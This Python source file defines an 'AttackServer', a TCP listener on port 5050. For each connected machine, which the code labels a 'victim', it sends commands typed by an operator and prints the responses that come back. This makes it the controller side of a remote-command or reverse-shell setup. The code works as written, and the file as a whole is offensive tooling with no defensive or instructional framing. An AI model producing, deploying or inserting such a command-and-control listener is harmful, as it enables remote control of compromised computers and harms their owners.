import socket
import threading


class AttackServer:
    def __init__(self, host = '0.0.0.0', port = 5050):
        self.ADDR = (host,port)
        self.IP = host
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(self.ADDR)
        self.LISTENING_LIMIT = 5
        self.FORMAT = 'utf-8'
        self.DISCONNECTED_MESSAGE = "stop"
        self.HEADER = 4096



    def send_commands_to_victim(self, client_socket, addr):
        while True:

            command = input(">>")
            if command.lower() == self.DISCONNECTED_MESSAGE:
                break
            client_socket.sendall(command.encode(self.FORMAT))
            print(f"[SENDING] sending command to {addr}")








    def receive_from_victim(self,client_socket,addr):
        while True:
            try:
                message = client_socket.recv(self.HEADER).decode(self.FORMAT)
                if message:
                    print(f"[RESPONSE] {message} from {addr}")
            except:
                print("[ERROR]")
                break

    def start(self):
        self.server_socket.listen(self.LISTENING_LIMIT)
        print(f"[LISTENING] server is listening on {self.ADDR}")
        while True:

            (client_socket, addr) = self.server_socket.accept()
            print(f"[CONNECTED] client connected from {addr}")
            threading.Thread(target=self.send_commands_to_victim, args=(client_socket,addr)).start()
            threading.Thread(target=self.receive_from_victim, args=(client_socket,addr)).start()


        self.server_socket.close()

if __name__ == "__main__":
    attack = AttackServer()
    attack.start()





